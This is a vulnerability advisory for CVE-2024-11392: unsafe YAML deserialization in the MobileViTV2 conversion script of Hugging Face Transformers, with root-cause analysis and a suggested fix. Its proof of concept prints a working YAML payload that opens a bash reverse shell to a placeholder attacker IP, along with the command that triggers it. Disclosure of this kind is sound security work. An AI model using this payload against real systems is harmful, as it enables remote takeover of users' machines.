## CVE-2024-11392

### Hugging Face Transformers MobileViTV2 Deserialization of Untrusted Data Remote Code Execution Vulnerability

**High-level overview and effects of the vulnerability:**
The vulnerability allows an attacker to execute arbitrary code on the host machine by supplying a malicious configuration file to the `convert_mlcvnets_to_pytorch.py` script in the Hugging Face Transformers repository. 
If an unsuspecting user uses a third-party model accompanied by a malicious configuration file, executing the `convert_mlcvnets_to_pytorch.py` script will lead to remote code execution (RCE) on the victim's system.

**The Vulnerable Product**
-   Product: Hugging Face Transformers
-   Module: MobileViTV2
-   File: transformers/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py
-   Version: Latest
-   GitHub Permalink: [https://github.com/huggingface/transformers/blob/bdb9106f247fca48a71eb384be25dbbd29b065a8/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py](https://github.com/huggingface/transformers/blob/bdb9106f247fca48a71eb384be25dbbd29b065a8/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py)

**Root Cause Analysis**

-   **Detailed description of the vulnerability:** The vulnerability results from unsafe deserialization of untrusted data. The script uses `yaml.load` function with the loader - `FullLoader`, which loads the full YAML language and is vulnerable to code execution.

-   **Code flow from input to the vulnerable condition:**
    1.  The user downloads a third-party `ml-cvnet` model alongside its configuration file.
    2.  The user runs the `convert_mlcvnets_to_pytorch.py` script and passes the configuration file to it.
    3.  The `convert_mlcvnets_to_pytorch.py` script deserializes the configuration file and executes the malicious code.
-   **Injection point:** The vulnerability occurs at the point where `yaml.load(yaml_file, Loader=yaml.FullLoader)` is called. 
GitHub Permalink: [https://github.com/huggingface/transformers/blob/bdb9106f247fca48a71eb384be25dbbd29b065a8/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py#L57](https://github.com/huggingface/transformers/blob/bdb9106f247fca48a71eb384be25dbbd29b065a8/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py#L57)
-   **Suggested fixes:** Replace `yaml.load(yaml_file, Loader=yaml.FullLoader)` with `yaml.safe_load(yaml_file)` to prevent the execution of arbitrary code.

-  **Instructions executing the proof-of-concept:**

1.  Create a malicious yaml configuration file `transformers_exploit.yaml` that will open a reverse shell on the victim's system:
```
!!python/object/new:type
args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
listitems: "__import__('os').system('bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1')"
```
2. Run the `convert_mlcvnets_to_pytorch.py` script and pass the  `transformers_exploit.yaml` file to `--orig_config_path`:
```
> python convert_mlcvnets_to_pytorch.py --orig_checkpoint_path dummy_checkpoint.pt --orig_config_path transformers_exploit.yaml --pytorch_dump_folder_path dummy_output --task imagenet1k_256
```
Note: The `dummy_checkpoint.pt`  can be left as an empty file,  `dummy_output` as an empty directory , and `task` as any of the options mentioned in the script.

**Software Download Link:**
[https://github.com/huggingface/transformers/tree/main](https://github.com/huggingface/transformers/tree/main)
